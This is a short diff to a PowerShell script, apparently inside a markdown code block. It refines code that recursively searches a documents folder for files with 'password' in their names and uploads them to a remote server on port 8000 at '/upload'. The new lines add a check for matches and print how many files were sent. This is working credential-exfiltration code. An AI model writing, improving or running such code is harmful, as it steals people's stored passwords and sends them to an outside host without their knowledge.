@@ -25,10 +25,14 @@ if($ckpath -eq $null) {
    $up.Port = 8000
    $up.Path = "/upload"
    $up.Expect100Continue = $false
-   Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName | ForEach-Object {
-      $up.AddFileReference("files", $_)
-   }
-   $null = $up.BlockingUpload()
+   $f = Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName
+   if($f -ne $null) {
+      $f | ForEach-Object { $up.AddFileReference("files", $_) }
+      $null = $up.BlockingUpload()
+      Write-Host "$($f.Count) files uploaded"
+   } else {
+      Write-Host "No matching files found"
+   } 
 }
 ```
 
